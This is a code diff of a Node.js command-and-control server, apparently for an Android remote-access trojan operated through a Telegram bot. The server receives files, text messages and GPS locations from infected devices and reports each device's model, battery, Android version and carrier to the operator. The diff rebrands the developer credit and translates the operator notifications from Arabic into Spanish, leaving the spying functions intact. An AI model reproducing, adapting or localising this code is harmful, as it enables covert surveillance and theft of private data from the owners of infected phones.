@@ -25,7 +25,7 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK</h1>')
+    res.send('<h1 align="center">ONLINE : 𓆪𓆪𓅓 ANDRIUX 𓅓𓆪𓆪 𖤛VIP المطور : @KING7ADX</h1>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
@@ -41,12 +41,12 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
     res.send('')
 })
 app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['text'], {parse_mode: "HTML"})
+    appBot.sendMessage(id, `°• Mensaje de<b>${req.headers.model}</b> Dispositivo\n\n` + req.body['text'], {parse_mode: "HTML"})
     res.send('')
 })
 app.post("/uploadLocation", (req, res) => {
     appBot.sendLocation(id, req.body['lat'], req.body['lon'])
-    appBot.sendMessage(id, `°• موقع من <b>${req.headers.model}</b> جهاز`, {parse_mode: "HTML"})
+    appBot.sendMessage(id, `°• Ubicacion<b>${req.headers.model}</b> Dispositivo`, {parse_mode: "HTML"})
     res.send('')
 })
 appSocket.on('connection', (ws, req) => {
@@ -66,22 +66,22 @@ appSocket.on('connection', (ws, req) => {
         provider: provider
     })
     appBot.sendMessage(id,
-        `°• جهاز جديد متصل\n\n` +
-        `• موديل الجهاز : <b>${model}</b>\n` +
-        `• البطارية : <b>${battery}</b>\n` +
-        `• نظام الاندرويد : <b>${version}</b>\n` +
-        `• سطوح الشاشة : <b>${brightness}</b>\n` +
-        `• مزود : <b>${provider}</b>`,
+        `°• Nuevo Dispositivo Conectado\n\n` +
+        `• Modelo de Dispositivo : <b>${model}</b>\n` +
+        `• Bateria : <b>${battery}</b>\n` +
+        `• Android : <b>${version}</b>\n` +
+        `• Brillo : <b>${brightness}</b>\n` +
+        `• Proveedor : <b>${provider}</b>`,
         {parse_mode: "HTML"}
     )
     ws.on('close', function () {
         appBot.sendMessage(id,
-            `°• لا يوجد جهاز متصل\n\n` +
-            `• موديل الجهاز : <b>${model}</b>\n` +
-            `• البطارية : <b>${battery}</b>\n` +
-            `• نظام الاندرويد : <b>${version}</b>\n` +
-            `• سطوح الشاشة : <b>${brightness}</b>\n` +
-            `• مزود : <b>${provider}</b>`,
+            `°• No hay ningun dispositivo conectado\n\n` +
+            `• Modelo de Dispositivo : <b>${model}</b>\n` +
+            `• Bateria : <b>${battery}</b>\n` +
+            `• Android : <b>${version}</b>\n` +
+            `• Brillo : <b>${brightness}</b>\n` +
+            `• Proveedor : <b>${provider}</b>`,
             {parse_mode: "HTML"}
         )
         appClients.delete(ws.uuid)
